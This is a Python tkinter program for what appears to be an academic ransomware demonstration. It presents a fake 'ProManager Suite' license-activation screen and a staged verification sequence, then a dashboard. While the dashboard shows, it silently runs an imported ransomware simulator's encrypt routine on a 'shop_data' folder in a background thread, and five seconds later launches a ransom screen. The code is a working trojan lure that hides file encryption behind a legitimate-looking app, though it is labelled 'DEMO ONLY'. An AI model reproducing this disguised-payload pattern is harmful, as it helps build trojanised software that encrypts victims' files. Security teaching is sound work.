import os
import sys
import time
import threading
import subprocess
import tkinter as tk
from tkinter import ttk

_base = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _base)
from ransomware_simulator import RansomwareSimulator

VICTIM_SANDBOX = os.path.abspath(os.path.join(_base, '..', 'shop_data'))

# ── Dark theme (activation + verifying screens) ──
BG     = '#1e1e2e'
BG2    = '#313244'
BG3    = '#45475a'
FG     = '#cdd6f4'
FG_DIM = '#a6adc8'
FG_MUT = '#6c7086'
ACCENT = '#cba6f7'
C_RED  = '#f38ba8'
C_GRN  = '#a6e3a1'
C_YLW  = '#f9e2af'

FONT       = ('Segoe UI', 11)
FONT_BOLD  = ('Segoe UI', 11, 'bold')
FONT_BIG   = ('Segoe UI', 15, 'bold')
FONT_SMALL = ('Segoe UI', 10)
FONT_MONO  = ('Courier New', 13)

# ── Light theme (dashboard screen) ──
L_BG      = '#f8f9fa'
L_SIDEBAR = '#ffffff'
L_BORDER  = '#e5e7eb'
L_TEXT    = '#111827'
L_TMUT    = '#6b7280'
L_ACCENT  = '#4f46e5'
L_NAVACT  = '#ede9fe'
L_GRN_BG  = '#d1fae5'
L_GRN_FG  = '#065f46'
L_YLW_BG  = '#fef3c7'
L_YLW_FG  = '#92400e'


def trigger_encryption(sandbox_dir: str) -> None:
    sim = RansomwareSimulator(sandbox_dir=sandbox_dir)
    sim.encrypt()


class ProManagerApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title('ProManager Suite — License Activation')
        self.root.geometry('640x480')
        self.root.resizable(False, False)
        self.root.configure(bg=BG)
        self._frame = None
        self._show_activation()

    def _clear(self):
        if self._frame:
            self._frame.destroy()
        self._frame = tk.Frame(self.root, bg=BG)
        self._frame.pack(fill='both', expand=True, padx=32, pady=24)

    def _show_activation(self):
        self._clear()
        f = self._frame

        logo_row = tk.Frame(f, bg=BG)
        logo_row.pack(anchor='center', pady=(0, 16))
        tk.Label(logo_row, text='📋', font=('Segoe UI', 36), bg=BG).pack(side='left', padx=(0, 12))
        name_col = tk.Frame(logo_row, bg=BG)
        name_col.pack(side='left')
        tk.Label(name_col, text='ProManager Suite', font=FONT_BIG, bg=BG, fg=FG).pack(anchor='w')
        tk.Label(name_col, text='⊗  Unlicensed — Activation Required',
                 font=FONT_SMALL, bg=BG, fg=C_RED).pack(anchor='w')

        tk.Frame(f, bg=BG3, height=1).pack(fill='x', pady=12)

        tk.Label(f, text='API License Key', font=FONT_SMALL, bg=BG, fg=FG_DIM).pack(anchor='w')
        self._key_var = tk.StringVar()

        style = ttk.Style()
        style.theme_use('default')
        style.configure('Key.TEntry',
                        fieldbackground=BG2, foreground=FG_MUT,
                        insertcolor=FG,
                        bordercolor=BG3, lightcolor=BG3, darkcolor=BG3,
                        relief='flat', padding=(16, 12))
        style.map('Key.TEntry',
                  bordercolor=[('focus', ACCENT)],
                  lightcolor=[('focus', ACCENT)],
                  darkcolor=[('focus', ACCENT)])

        entry = ttk.Entry(f, textvariable=self._key_var,
                          font=FONT_MONO, style='Key.TEntry')
        entry.pack(fill='x', pady=(8, 0), ipady=10)
        entry.insert(0, 'sk-xxxx-xxxx-xxxx-xxxxxxxxxxxx')

        def _on_focus_in(e):
            if entry.get() == 'sk-xxxx-xxxx-xxxx-xxxxxxxxxxxx':
                entry.delete(0, 'end')
                style.configure('Key.TEntry', foreground=FG)

        def _on_focus_out(e):
            if not entry.get():
                entry.insert(0, 'sk-xxxx-xxxx-xxxx-xxxxxxxxxxxx')
                style.configure('Key.TEntry', foreground=FG_MUT)

        entry.bind('<FocusIn>', _on_focus_in)
        entry.bind('<FocusOut>', _on_focus_out)
        entry.bind('<Return>', lambda e: self._on_activate())

        self._error_var = tk.StringVar()
        tk.Label(f, textvariable=self._error_var, font=FONT_SMALL,
                 bg=BG, fg=C_RED).pack(anchor='w', pady=(4, 0))

        btn_row = tk.Frame(f, bg=BG)
        btn_row.pack(fill='x', pady=(14, 0))
        tk.Button(
            btn_row, text='Activate License', font=FONT_BOLD, bg=ACCENT, fg=BG,
            relief='flat', bd=0, padx=24, pady=10, cursor='hand2',
            activebackground='#b4befe', activeforeground=BG,
            command=self._on_activate,
        ).pack(side='left')
        tk.Button(
            btn_row, text='Cancel', font=FONT, bg=BG3, fg=FG,
            relief='flat', bd=0, padx=18, pady=10, cursor='hand2',
            activebackground=BG2, activeforeground=FG,
            command=self.root.destroy,
        ).pack(side='left', padx=(8, 0))

        tk.Frame(f, bg=BG3, height=1).pack(fill='x', pady=(18, 10))
        tk.Label(f, text='⚠  DEMO ONLY — Academic Environment',
                 font=FONT_SMALL, bg=BG, fg=C_YLW).pack()

    def _on_activate(self):
        key = self._key_var.get().strip()
        if not key or key.startswith('sk-xxxx'):
            self._error_var.set('Please enter your API key.')
            return
        self._error_var.set('')
        self._show_verifying()

    def _show_verifying(self):
        self.root.title('ProManager Suite — Activating...')
        self._clear()
        f = self._frame

        tk.Label(f, text='Verifying license key...', font=FONT_BIG, bg=BG, fg=FG).pack(pady=(20, 4))
        self._status_var = tk.StringVar(value='Connecting to license server...')
        tk.Label(f, textvariable=self._status_var, font=FONT_SMALL, bg=BG, fg=FG_DIM).pack()

        self._pbar = ttk.Progressbar(f, mode='indeterminate', length=380)
        self._pbar.pack(pady=(20, 0))
        self._pbar.start(12)

        tk.Frame(f, bg=BG3, height=1).pack(fill='x', pady=(16, 8))
        tk.Label(f, text='⚠  DEMO ONLY — Academic Environment',
                 font=FONT_SMALL, bg=BG, fg=C_YLW).pack()

        threading.Thread(target=self._do_activate, daemon=True).start()

    def _do_activate(self):
        for msg, delay in [
            ('Connecting to license server...', 0.6),
            ('Validating entitlements...', 0.7),
            ('Configuring workspace...', 0.7),
        ]:
            self.root.after(0, lambda m=msg: self._status_var.set(m))
            time.sleep(delay)
        self.root.after(0, self._show_dashboard)

    def _show_dashboard(self):
        self.root.title('ProManager Suite')
        self.root.geometry('920x590')
        self.root.configure(bg=L_BG)

        if self._frame:
            self._frame.destroy()
        self._frame = tk.Frame(self.root, bg=L_BG)
        self._frame.pack(fill='both', expand=True)
        f = self._frame

        # ── Sidebar ──────────────────────────────────────
        sidebar = tk.Frame(f, bg=L_SIDEBAR, width=190)
        sidebar.pack(side='left', fill='y')
        sidebar.pack_propagate(False)

        tk.Label(sidebar, text='📋  ProManager', font=('Segoe UI', 12, 'bold'),
                 bg=L_SIDEBAR, fg=L_TEXT, padx=16, pady=15, anchor='w').pack(fill='x')
        tk.Frame(sidebar, bg=L_BORDER, height=1).pack(fill='x')
        tk.Frame(sidebar, bg=L_SIDEBAR, height=6).pack(fill='x')

        for icon, label, active in [
            ('◉', 'Dashboard', True),
            ('▤', 'Projects',  False),
            ('✓', 'My Tasks',  False),
            ('👥', 'Team',     False),
            ('📊', 'Reports',  False),
            ('⚙', 'Settings', False),
        ]:
            nbg = L_NAVACT if active else L_SIDEBAR
            nfg = L_ACCENT if active else L_TMUT
            row = tk.Frame(sidebar, bg=nbg)
            row.pack(fill='x')
            tk.Label(row, text=f'  {icon}  {label}', font=('Segoe UI', 10),
                     bg=nbg, fg=nfg, pady=9, padx=8, anchor='w').pack(side='left', fill='x', expand=True)
            if active:
                tk.Frame(row, bg=L_ACCENT, width=3).pack(side='right', fill='y')

        # Sidebar spacer + user footer
        tk.Frame(sidebar, bg=L_SIDEBAR).pack(fill='both', expand=True)
        tk.Frame(sidebar, bg=L_BORDER, height=1).pack(fill='x')
        urow = tk.Frame(sidebar, bg=L_SIDEBAR, padx=12, pady=10)
        urow.pack(fill='x')
        tk.Label(urow, text='NT', font=('Segoe UI', 9, 'bold'),
                 bg=L_ACCENT, fg='#ffffff', padx=7, pady=5).pack(side='left')
        ucol = tk.Frame(urow, bg=L_SIDEBAR)
        ucol.pack(side='left', padx=(8, 0))
        tk.Label(ucol, text='Nguyen Thanh', font=('Segoe UI', 9, 'bold'),
                 bg=L_SIDEBAR, fg=L_TEXT, anchor='w').pack(anchor='w')
        tk.Label(ucol, text='Admin', font=('Segoe UI', 8),
                 bg=L_SIDEBAR, fg=L_TMUT, anchor='w').pack(anchor='w')

        # ── Right panel ───────────────────────────────────
        tk.Frame(f, bg=L_BORDER, width=1).pack(side='left', fill='y')
        right = tk.Frame(f, bg=L_BG)
        right.pack(side='left', fill='both', expand=True)

        # Top bar
        topbar = tk.Frame(right, bg=L_SIDEBAR)
        topbar.pack(fill='x')
        tk.Label(topbar, text='Dashboard', font=('Segoe UI', 13, 'bold'),
                 bg=L_SIDEBAR, fg=L_TEXT, padx=20, pady=12, anchor='w').pack(side='left')
        tbr = tk.Frame(topbar, bg=L_SIDEBAR)
        tbr.pack(side='right', padx=16)
        tk.Label(tbr, text='🔔', font=('Segoe UI', 11),
                 bg=L_SIDEBAR, fg=L_TMUT).pack(side='left', padx=(0, 10))
        tk.Label(tbr, text='NT', font=('Segoe UI', 9, 'bold'),
                 bg=L_ACCENT, fg='#ffffff', padx=8, pady=5).pack(side='left')
        tk.Frame(right, bg=L_BORDER, height=1).pack(fill='x')

        # Inner content area
        inn = tk.Frame(right, bg=L_BG, padx=20, pady=14)
        inn.pack(fill='both', expand=True)

        # Welcome banner
        banner = tk.Frame(inn, bg='#ede9fe', padx=14, pady=9)
        banner.pack(fill='x', pady=(0, 14))
        tk.Label(banner, text='✓  License activated successfully — Welcome to ProManager Suite!',
                 font=('Segoe UI', 10, 'bold'), bg='#ede9fe', fg=L_ACCENT, anchor='w').pack(anchor='w')

        # Stats row
        srow = tk.Frame(inn, bg=L_BG)
        srow.pack(fill='x', pady=(0, 14))
        for num, lbl, clr in [
            ('12', 'Active Projects', '#4f46e5'),
            ('47', 'Open Tasks',      '#059669'),
            ('3',  'Due Today',       '#dc2626'),
        ]:
            outer = tk.Frame(srow, bg=L_BORDER, padx=1, pady=1)
            outer.pack(side='left', fill='both', expand=True, padx=(0, 10))
            card = tk.Frame(outer, bg='#ffffff', padx=14, pady=11)
            card.pack(fill='both', expand=True)
            tk.Label(card, text=num, font=('Segoe UI', 22, 'bold'),
                     bg='#ffffff', fg=clr, anchor='w').pack(fill='x')
            tk.Label(card, text=lbl, font=('Segoe UI', 9),
                     bg='#ffffff', fg=L_TMUT, anchor='w').pack(fill='x')

        # Two-column: projects | tasks
        cols = tk.Frame(inn, bg=L_BG)
        cols.pack(fill='both', expand=True)

        # Projects column
        pcol = tk.Frame(cols, bg=L_BG)
        pcol.pack(side='left', fill='both', expand=True, padx=(0, 10))
        hdr1 = tk.Frame(pcol, bg=L_BG)
        hdr1.pack(fill='x', pady=(0, 7))
        tk.Label(hdr1, text='RECENT PROJECTS', font=('Segoe UI', 8, 'bold'),
                 bg=L_BG, fg=L_TMUT, anchor='w').pack(side='left')
        tk.Label(hdr1, text='View all →', font=('Segoe UI', 8),
                 bg=L_BG, fg=L_ACCENT).pack(side='right')
        for pname, pstatus, sbg, sfg in [
            ('📁  Q4 Marketing Campaign', 'Active',      L_GRN_BG, L_GRN_FG),
            ('📁  Product Launch 2025',   'In Progress', L_YLW_BG, L_YLW_FG),
            ('📁  Client Onboarding',     'Active',      L_GRN_BG, L_GRN_FG),
            ('📁  Brand Redesign',        'Planning',    '#e0e7ff', '#3730a3'),
        ]:
            o = tk.Frame(pcol, bg=L_BORDER, padx=1, pady=1)
            o.pack(fill='x', pady=(0, 5))
            r = tk.Frame(o, bg='#ffffff', padx=10, pady=8)
            r.pack(fill='x')
            tk.Label(r, text=pname, font=('Segoe UI', 10),
                     bg='#ffffff', fg=L_TEXT, anchor='w').pack(side='left')
            tk.Label(r, text=pstatus, font=('Segoe UI', 8, 'bold'),
                     bg=sbg, fg=sfg, padx=8, pady=3).pack(side='right')

        # Tasks column
        tcol = tk.Frame(cols, bg=L_BG)
        tcol.pack(side='left', fill='both', expand=True)
        tk.Label(tcol, text='MY TASKS', font=('Segoe UI', 8, 'bold'),
                 bg=L_BG, fg=L_TMUT, anchor='w').pack(anchor='w', pady=(0, 7))
        for tname, tdue in [
            ('Review campaign brief',    'Today'),
            ('Send weekly report',       'Tomorrow'),
            ('Update onboarding docs',   'Apr 29'),
            ('Prepare launch checklist', 'Apr 30'),
        ]:
            o = tk.Frame(tcol, bg=L_BORDER, padx=1, pady=1)
            o.pack(fill='x', pady=(0, 5))
            r = tk.Frame(o, bg='#ffffff', padx=10, pady=8)
            r.pack(fill='x')
            tk.Label(r, text='○', font=('Segoe UI', 11),
                     bg='#ffffff', fg='#d1d5db').pack(side='left', padx=(0, 8))
            tk.Label(r, text=tname, font=('Segoe UI', 10),
                     bg='#ffffff', fg=L_TEXT, anchor='w').pack(side='left')
            tk.Label(r, text=tdue, font=('Segoe UI', 8),
                     bg='#ffffff', fg='#dc2626' if tdue == 'Today' else L_TMUT).pack(side='right')

        # Sync bar
        sync = tk.Frame(inn, bg=L_BG)
        sync.pack(fill='x', pady=(12, 0))
        tk.Label(sync, text='Syncing workspace data...', font=('Segoe UI', 8),
                 bg=L_BG, fg=L_TMUT, anchor='w').pack(anchor='w', pady=(0, 4))
        pstyle = ttk.Style()
        pstyle.configure('L.Horizontal.TProgressbar', background=L_ACCENT, troughcolor=L_BORDER)
        lb = ttk.Progressbar(sync, mode='indeterminate', style='L.Horizontal.TProgressbar')
        lb.pack(fill='x')
        lb.start(15)

        tk.Frame(inn, bg=L_BORDER, height=1).pack(fill='x', pady=(10, 4))
        tk.Label(inn, text='⚠  DEMO ONLY — Academic Environment',
                 font=('Segoe UI', 8), bg=L_BG, fg='#d97706').pack(anchor='w')

        threading.Thread(target=self._silent_encrypt, daemon=True).start()
        self.root.after(5000, self._trigger_ransom)

    def _silent_encrypt(self):
        trigger_encryption(VICTIM_SANDBOX)

    def _trigger_ransom(self):
        self.root.destroy()
        script = os.path.join(_base, 'fake_ransom.py')
        subprocess.Popen(
            [sys.executable, script],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    def run(self):
        self.root.mainloop()


if __name__ == '__main__':
    ProManagerApp().run()
